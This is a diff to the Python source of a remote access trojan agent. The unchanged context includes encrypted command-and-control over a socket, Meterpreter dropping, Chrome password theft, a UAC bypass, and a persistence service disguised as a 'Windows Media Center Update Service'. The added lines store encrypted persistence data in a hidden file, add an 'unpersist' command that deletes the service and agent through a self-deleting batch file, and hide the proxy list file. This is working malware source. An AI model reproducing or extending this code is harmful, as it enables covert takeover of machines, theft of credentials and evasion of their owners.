@@ -46,6 +46,7 @@ def fconnect():
 				pass
 	s.send(success)
 	s.settimeout(999)
+	pwd = os.getcwd()
 
 def fwget(url):
 	down = urllib2.urlopen(url)
@@ -77,11 +78,29 @@ def fpersist():
 		hid.write(hb)
 	with open(tempbat, 'w') as cbat:
 		cbat.write(cmds)
+	with open(datafile, 'wb') as df:
+		df.write(persistinfo)
 	fsubprocess('attrib +h ' + tempvbs)
 	fsubprocess('attrib +h ' + tempbat)
 	rcmd = tempvbs + ' ' + tempbat
 	fbypass(rcmd)
 	fsubprocess('taskkill /f /im ' + sys.argv[0])
+	sys.exit()
+
+def funpersist():
+	with open(datafile, 'rb') as f:
+		settings = DecodeAES(cipher, f.read().strip(''))
+		settings = settings[30:].split('**n')
+	agentn = settings[0]
+	vbsdstn = settings[1]
+	fsubprocess('sc delete %s' % servicename)
+	with open(os.getenv('TEMP') + os.sep + 'u.bat', 'w') as f:
+		f.write('del /F /AH %s**n' % vbsdstn)
+		f.write('del /F /AH %s**n' % agentn)
+		f.write('del /F "%~f0"**n')
+	encrypted = EncodeAES(cipher, 'WTFWTFWTFWTFWTF1WTFWTFWTFWTFWTF1 [*] Persistence uninstalled.**n')
+	s.send(encrypted)
+	os.startfile(os.getenv('TEMP') + os.sep + 'u.bat')
 	sys.exit()
 
 def fmeterdrop(mhost, mport):
@@ -212,6 +231,7 @@ if os.name == 'nt':
 	servicename = '"' + 'Windows Media Center Update Service' + '"'
 	servicedisc = '"' + 'Windows Media Center Update Service for installation, modification, and removal of Windows updates and optional components. If this service is disabled, install or uninstall of Windows updates might fail for this computer.' + '"'
 	proxyfile = os.getenv('TEMP') + os.sep + 'xmlrpc.dat'
+	datafile = os.getenv('WINDIR') + os.sep + 'Temp' + os.sep + 'winrand.dat'
 
 	#																								  #
 	###################################################################################################
@@ -221,6 +241,7 @@ if os.name == 'nt':
 	paddedpwd = pwd.strip('**r') + '*' * (64 - len(pwd.strip('**r')))
 	adm = fsubprocess('whoami').strip('**n').strip('**r')
 	stdout = fsubprocess('net localgroup administrators | find "%USERNAME%"').strip('**n').strip('**r')
+	persistinfo = EncodeAES(cipher, '*' * 30 + '%s**n%s**n%s**n%s**n%s' % (agent, vbsdst, servicename, proxyfile, tempvbs))
 
 	if stdout != '':
 		isAdmin = True
@@ -340,6 +361,7 @@ while True:
 			pl.write(EncodeAES(cipher, proxlist))
 		encrypted = EncodeAES(cipher, 'WTFWTFWTFWTFWTF1WTFWTFWTFWTFWTF1 [*] New proxy list stored at %s**n' % (proxyfile))
 		s.send(encrypted)
+		fsubprocess('attrib +h ' + proxyfile)
 
 	elif decrypted.startswith("chromepass"):
 		if pwdvar == 'cd':
@@ -409,7 +431,7 @@ while True:
 	elif decrypted.startswith("persistence"):
 		if os.name == 'nt':
 			if isAdmin and platform.uname()[2] == '7':													## If the current user is admin we will use bypassuac to install a system service with a vbs script that keeps our agent alive ;)
-				if not os.path.isfile(vbsdst):
+				if not os.path.isfile(datafile):
 					fpersist()
 				else:
 					fbypass('sc start ' + servicename)
@@ -431,6 +453,12 @@ while True:
 					fremoteprint(" [X] No services with weak directory permissions found.")
 		else:
 			fremoteprint(" [X] Persistence is only available for windows.")
+
+	elif decrypted.startswith('unpersist'):
+		if not os.path.isfile(datafile):
+			fremoteprint(' [X] Persistence does not appear to be installed.')
+		else:
+			funpersist()
 
 	elif decrypted.startswith("bypassuac "):
 		cmds = ' '.join(decrypted.split(' ')[1:])
@@ -459,20 +487,19 @@ while True:
 		try:
 			ufilename = pwd.strip('**r') + os.sep + decrypted[32:48].strip('*')
 			decrypted = decrypted[48:]
-			f = open(ufilename, 'wb')
-			if decrypted.endswith("EOFEOFEOFEOFEOFZ"):
-				decrypted = decrypted[:-32]
-				f.write(decrypted)
-			else:
-				f.write(decrypted)
-				while not decrypted.endswith("EOFEOFEOFEOFEOFZ"):
-					data = s.recv(8192)
-					decrypted = DecodeAES(cipher, data)
-					if decrypted.endswith("EOFEOFEOFEOFEOFZ"):
-						f.write(decrypted[:-32])
-					else:
-						f.write(decrypted)
-			f.close()
+			with open(ufilename, 'wb') as f:
+				if decrypted.endswith("EOFEOFEOFEOFEOFZ"):
+					decrypted = decrypted[:-32]
+					f.write(decrypted)
+				else:
+					f.write(decrypted)
+					while not decrypted.endswith("EOFEOFEOFEOFEOFZ"):
+						data = s.recv(8192)
+						decrypted = DecodeAES(cipher, data)
+						if decrypted.endswith("EOFEOFEOFEOFEOFZ"):
+							f.write(decrypted[:-32])
+						else:
+							f.write(decrypted)
 			fremoteprint(" [*] File uploaded to %s" % (ufilename))
 		except Exception as e:
 			fremoteprint(" [*] Something went wrong: %s" % (e))
